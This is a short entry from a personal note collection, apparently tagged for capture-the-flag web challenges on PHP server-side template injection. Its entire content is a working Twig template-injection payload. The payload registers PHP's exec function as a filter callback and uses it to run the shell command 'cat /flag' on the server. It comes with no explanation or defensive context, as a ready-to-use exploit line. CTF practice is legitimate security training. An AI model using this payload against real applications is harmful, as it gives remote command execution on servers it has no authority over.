tags:: [[CTFWEB/PHP/SSTI]]

- ```
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
  ```